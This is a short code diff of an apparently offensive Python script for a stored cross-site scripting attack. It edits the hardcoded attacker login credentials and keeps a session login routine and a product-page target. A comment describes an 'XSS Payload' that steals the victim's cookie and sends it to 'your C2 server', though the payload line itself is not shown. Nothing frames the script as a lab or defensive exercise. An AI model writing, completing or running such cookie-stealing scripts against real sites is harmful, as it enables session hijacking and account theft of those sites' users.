@@ -7,8 +7,8 @@ LOGIN_URL = f"{BASE_URL}/login.php"
 TARGET_PRODUCT_URL = f"{BASE_URL}/product_view.php?id=81"
 
 # --- Login Credentials ---
-USERNAME = "hacker"
-PASSWORD = "hacker123"
+USERNAME = "HUCKER"
+PASSWORD = "hucker123"
 
 # --- XSS Payload ---
 # The code that steals the cookie and sends it to your C2 server
@@ -31,7 +31,6 @@ def perform_stored_xss():
     }
     
     response = session.post(LOGIN_URL, data=login_data)
-    
     if "home.php" in response.url or session.cookies.get("PHPSESSID"):
         print(f"[+] Login successful as {USERNAME}!")
     else:
